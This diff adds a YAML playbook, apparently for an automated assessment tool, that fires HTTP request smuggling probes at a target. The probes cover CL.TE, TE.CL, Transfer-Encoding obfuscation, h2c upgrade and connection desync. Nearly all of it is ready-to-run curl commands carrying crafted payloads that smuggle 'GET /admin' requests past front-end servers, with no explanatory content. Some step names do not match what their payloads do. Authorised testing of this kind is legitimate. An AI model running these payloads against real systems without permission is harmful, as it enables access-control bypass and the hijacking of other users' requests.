@@ -1,0 +1,195 @@
+name: "HTTP Request Smuggling"
+description: "HTTP request smuggling attacks: CL.TE, TE.CL, TE.TE, transfer-encoding obfuscation, and connection-based desync detection"
+version: "1.0"
+
+vars:
+  wordlist: "/wordlists/webcontent-top-10000.txt"
+
+preflight:
+  - id: setup
+    type: log
+    message: "HTTP request smuggling assessment against {target} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Technology detection ----
+  - id: tech_detect
+    name: "Front-end / back-end fingerprint"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: curl_headers
+        name: "Server & LB response headers"
+        tool: curl
+        args: ["-sI", "{target}",
+               "-w", "HTTP %{http_version}\\n",
+               "-D", "{case_dir}/smuggle_headers.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/smuggle_headers.txt"]
+
+      - id: whatweb
+        name: "Technology fingerprint (WAF/LB detection)"
+        tool: whatweb
+        args: ["-a3", "{target}", "--log-verbose", "{case_dir}/whatweb-smuggle.txt"]
+        timeout: 60
+
+      - id: httpver_check
+        name: "HTTP/2 capability check"
+        tool: curl
+        args: ["-sI", "--http2", "{target}",
+               "-o", "{case_dir}/http2_check.txt"]
+        timeout: 30
+
+  # ---- Phase 2: CL.TE smuggling ----
+  - id: cl_te
+    name: "Content-Length / Transfer-Encoding smuggling"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: cl_te_basic
+        name: "CL.TE basic probe"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Transfer-Encoding: chunked",
+               "-H", "Content-Length: 4",
+               "-d", "1e\\nX\\n0\\n\\nGET /admin HTTP/1.1\\nHost: localhost\\n\\n",
+               "{target}",
+               "-D", "{case_dir}/smuggle_clte_basic.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/smuggle_clte_basic.txt"]
+
+      - id: cl_te_gp
+        name: "CL.TE — grab prefix"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Transfer-Encoding: chunked",
+               "-H", "Content-Length: 6",
+               "-d", "0\\r\\n\\r\\nG",
+               "{target}",
+               "-D", "{case_dir}/smuggle_clte_gp.txt"]
+        timeout: 30
+
+  # ---- Phase 3: TE.CL smuggling ----
+  - id: te_cl
+    name: "Transfer-Encoding / Content-Length smuggling"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: te_cl_basic
+        name: "TE.CL basic probe"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Transfer-Encoding: chunked",
+               "-d", "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n",
+               "{target}",
+               "-D", "{case_dir}/smuggle_tecl_basic.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/smuggle_tecl_basic.txt"]
+
+      - id: te_cl_time
+        name: "TE.CL — time-based detection"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Transfer-Encoding: chunked",
+               "-d", "0\\r\\n\\r\\nX",
+               "{target}",
+               "-w", "\\nTime: %{time_total}s",
+               "-D", "{case_dir}/smuggle_tecl_time.txt"]
+        timeout: 30
+
+  # ---- Phase 4: TE.TE (TE obfuscation) ----
+  - id: te_te
+    name: "Transfer-Encoding obfuscation"
+    type: parallel
+    max_workers: 6
+    steps:
+      - id: te_obfuscate_case
+        name: "TE: case obfuscation"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Transfer-Encoding: xchunked",
+               "-d", "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n",
+               "{target}",
+               "-D", "{case_dir}/smuggle_te_case.txt"]
+        timeout: 30
+
+      - id: te_obfuscate_multi
+        name: "TE: multiple TE headers"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Transfer-Encoding: chunked",
+               "-H", "Transfer-Encoding: identity",
+               "-d", "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n",
+               "{target}",
+               "-D", "{case_dir}/smuggle_te_multi.txt"]
+        timeout: 30
+
+      - id: te_obfuscate_newline
+        name: "TE: newline obfuscation"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Transfer-Encoding:\\tchunked",
+               "-d", "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n",
+               "{target}",
+               "-D", "{case_dir}/smuggle_te_tab.txt"]
+        timeout: 30
+
+      - id: te_obfuscate_space
+        name: "TE: space obfuscation"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Transfer-Encoding : chunked",
+               "-d", "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n",
+               "{target}",
+               "-D", "{case_dir}/smuggle_te_space.txt"]
+        timeout: 30
+
+  # ---- Phase 5: HTTP/2 downgrade smuggling ----
+  - id: h2_smuggle
+    name: "HTTP/2 downgrade smuggling (h2c)"
+    type: parallel
+    max_workers: 2
+    steps:
+      - id: h2c_upgrade
+        name: "h2c upgrade request"
+        tool: curl
+        args: ["-s", "--http2", "-X", "POST",
+               "-H", "Upgrade: h2c",
+               "-H", "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA",
+               "{target}",
+               "-D", "{case_dir}/smuggle_h2c.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/smuggle_h2c.txt"]
+
+  # ---- Phase 6: Desync detection ----
+  - id: desync_detect
+    name: "Connection desync detection"
+    type: sequential
+    steps:
+      - id: desync_baseline
+        name: "Baseline request"
+        tool: curl
+        args: ["-s", "{target}/", "-D", "{case_dir}/desync_baseline.txt"]
+        timeout: 30
+
+      - id: desync_test
+        name: "Desync probe (pipelined)"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Transfer-Encoding: chunked",
+               "-d", "0\\r\\n\\r\\nGET /404 HTTP/1.1\\r\\nHost: {target}\\r\\n\\r\\n",
+               "{target}",
+               "-D", "{case_dir}/desync_test.txt"]
+        timeout: 30
+
+  # ---- Phase 7: Report ----
+  - id: report
+    name: "HTTP smuggling note"
+    type: log
+    message: |
+      HTTP request smuggling assessment complete for {target}.
+      Results in {case_dir}/:
+      - CL.TE: smuggle_clte_basic.txt, smuggle_clte_gp.txt
+      - TE.CL: smuggle_tecl_basic.txt, smuggle_tecl_time.txt
+      - TE.TE obfuscation: smuggle_te_case.txt, smuggle_te_multi.txt, smuggle_te_tab.txt
+      - HTTP/2: smuggle_h2c.txt
+      - Desync: desync_baseline.txt, desync_test.txt
